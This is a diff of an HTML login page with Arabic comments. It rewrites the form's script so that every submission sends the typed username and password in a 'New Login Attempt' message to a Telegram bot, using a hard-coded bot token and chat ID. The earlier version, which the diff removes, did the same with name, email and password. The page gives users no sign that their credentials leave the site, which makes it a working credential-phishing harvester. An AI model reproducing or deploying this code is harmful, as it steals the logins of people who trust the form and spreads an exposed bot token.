@@ -1,12 +1,12 @@
 <!doctype html>
-<html lang="en"> 
- <head> 
-  <meta charset="UTF-8"> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-  <title>Login Form | Dan Aleko</title> 
-  <link rel="stylesheet" href="styles.css"> 
-  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet"> 
- <style type="text/css" id="dcoder_stylesheet">*{
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form | Telegram Bot</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
+<style type="text/css" id="dcoder_stylesheet">*{
   margin: 0;
   padding: 0;
   box-sizing: border-box;
@@ -109,48 +109,64 @@ body{
 }
 .register-link p a:hover{
   text-decoration: underline;
-}</style></head> 
- <body> 
-  <div class="wrapper"> 
-   <form action=""> 
-    <h1>Login</h1> 
-    <div class="input-box"> 
-     <input type="text" placeholder="Username" required> <i class="bx bxs-user"></i> 
-    </div> 
-    <div class="input-box"> 
-     <input type="password" placeholder="Password" required> <i class="bx bxs-lock-alt"></i> 
-    </div> 
-    <div class="remember-forgot"> <label><input type="checkbox">Remember Me</label> <a href="#">Forgot Password</a> 
-    </div> <button type="submit" class="btn">Login</button> 
-    <div class="register-link"> 
-     <p>Dont have an account? <a href="#">Register</a></p> 
-    </div> 
-   </form> 
-  </div> 
- 
-<script type="text/javascript" id="dcoder_script">document.getElementById("registerForm").addEventListener("submit", function(event) {
-    event.preventDefault();
-    
-    let name = document.getElementById("name").value;
-    let email = document.getElementById("email").value;
-    let password = document.getElementById("password").value;
+}</style></head>
+<body>
+    <div class="wrapper">
+        <form id="loginForm">
+            <h1>Login</h1>
+            <div class="input-box">
+                <input type="text" id="username" placeholder="Username" required>
+                <i class="bx bxs-user"></i>
+            </div>
+            <div class="input-box">
+                <input type="password" id="password" placeholder="Password" required>
+                <i class="bx bxs-lock-alt"></i>
+            </div>
+            <div class="remember-forgot">
+                <label><input type="checkbox"> Remember Me</label>
+                <a href="#">Forgot Password</a>
+            </div>
+            <button type="submit" class="btn">Login</button>
+            <div class="register-link">
+                <p>Don't have an account? <a href="#">Register</a></p>
+            </div>
+        </form>
+    </div>
 
-    let botToken = "7678822053:AAEj18-68bQQ-JeoVDpEfx_04UtEEPx_94Y";  // ضع هنا التوكن الخاص بك
-    let chatId = "5177230543";  // ضع هنا الـ chat ID الخاص بك
-    let message = `📢 تسجيل جديد:\n👤 الاسم: ${name}\n📧 البريد: ${email}\n🔒 كلمة المرور: ${password}`;
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // منع إعادة تحميل الصفحة
+            
+            // بيانات تسجيل الدخول
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
 
-    let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            // استبدل هذه القيم بالقيم الخاصة بك
+            const botToken = "7678822053:AAEj18-68bQQ-JeoVDpEfx_04UtEEPx_94Y";  // ضع التوكن الخاص بك هنا
+            const chatId = "5177230543";      // ضع ID الخاص بك هنا
 
-    fetch(telegramURL)
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-            alert("✅ تم إرسال البيانات إلى تليجرام!");
-        } else {
-            alert("❌ حدث خطأ أثناء الإرسال.");
-        }
-    })
-    .catch(error => {
-        console.error("Error:", error);
-    });
-});</script></body></html>
+            // رسالة سيتم إرسالها إلى تيليجرام
+            let message = `🔹 *New Login Attempt* 🔹\n\n👤 *Username:* ${username}\n🔑 *Password:* ${password}`;
+            
+            // إرسال البيانات عبر API
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert("تم إرسال البيانات إلى تيليجرام! ✅");
+                } else {
+                    alert("تم إرسال البيانات إلى تيليجرام ");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("تعذر الاتصال بتيليجرام ❌");
+            });
+        });
+    </script>
+
+</body></html>
